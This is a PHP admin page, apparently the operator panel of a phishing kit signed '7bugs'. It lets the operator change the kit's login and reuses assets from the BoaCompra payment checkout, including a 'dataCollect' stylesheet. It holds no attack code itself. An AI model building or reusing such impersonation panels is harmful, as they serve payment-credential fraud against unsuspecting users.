		<?php
error_reporting(0);
			include("verifica.php");
			if(isset($_GET["acao"]) && $_GET["acao"] == "logout"){
				
				setcookie("logado","");
				echo '
				<script type="text/javascript">
				alert("Voce foi deslogado com sucesso, redirecionando clique em ok");
				location="index.php";
				</script>
				';
			}
		?>
		


<html lang="en">
 <head> 
  <title>ALTERAR USUARIO</title> 
  <meta charset="UTF-8">
  <meta name="robots" content="noindex"> 
  <meta name="theme-color" content="black"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"> 
  <link rel="dns-prefetch" href="https://in.hotjar.com"> 
  <link rel="dns-prefetch" href="https://vars.hotjar.com"> 
  <link rel="dns-prefetch" href="https://script.hotjar.com"> 
  <link rel="dns-prefetch" href="https://static.hotjar.com"> 
  <link rel="dns-prefetch" href="https://me.jsuol.com.br"> 
  <link rel="dns-prefetch" href="https://api.boacompra.com"> 
  <link rel="dns-prefetch" href="//me.jsuol.com.br"> 
  <link rel="icon" href="https://payment.boacompra.com/statics//images/favicon.ico"> 
 
  <link rel="stylesheet" href="dataCollect/tokenized.css"> 
  <script async src="https://me.jsuol.com.br/aud/boacompracheckout.js"></script>
  <script async src="https://static.hotjar.com/c/hotjar-596441.js"></script>
  <script async src="https://script.hotjar.com/modules.24670e88b088e10656d2.js" charset="utf-8"></script>
 
<style> #tudo { background: url(teste.jpeg) no-repeat center center;background-size: 100%; } </style> 

<div class="tudo">
<style>
BODY {
background-color : black;
}


.btn {
padding: 10px 50px;
border-radius: 4px; 
text-align: center;
vertical-align: middle; 
}
.btn-info {
background-color: red;
border-color: red;
color: #fff;
}
.btn-info:hover, .btn-info:focus, .btn-info:acitive {
background-color: #31b0d5;
border-color: #269abc;
color: #fff;
}



</style>
 </head> 
 <body class="tudo"> 

  

<center>
<div> <table> <tr> <td> <div> <a class="button" href="index.php" style="float: right; border:1px solid; padding: 11px 21px; vertical-align: middle; background:red; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">INICIO</a> </div> </td> <td> <div> <a class="button" href="deslogar.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:red; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">DESLOGAR</a>  </tr> </table> </div>

</center>
<center>

<h1 style="color:red;">By : 7bugs<h1>
    <div class="header__logo"> 
     <img src="https://i.pinimg.com/originals/7e/5c/07/7e5c0701fba480e5c59ccf400ea18e55.gif" style="width:100%" alt="UMBRELA" title="HAWKING"> 
    
 

     <form id="form" action="add_usuario.php" method="POST" class="tokenized__form"> 
      
<div class="tokenized__wrapper tokenized__wrapper--form"> 
       
        
<div class="tokenized__fields"> 
        

         
          <div> 
		  
<input class="field-group__input" autocomplete="off" id="usuario" name="usuario"  placeholder=" novo usuário" type="text" required data-hj-masked=""> 

</div>
</div>
</div>
<input class="field-group__input" autocomplete="off" id="senha" name="senha"  placeholder="Digite sua nova senha" type="password" required data-hj-masked=""> 
       


</div>
      
</div>
         
<center>
       <button type="submit" class="btn btn-info "> CONFIRMAR <n> </button> 
</form>
 <div> 
  <div> 
   <div> 
    <div> 
<h1 style="color:red;">DEPOIS DE ALTERADO O LOGIN ANTIGO FICA INATIVO<h1>
</div>
</div>
</div>
</center>
    
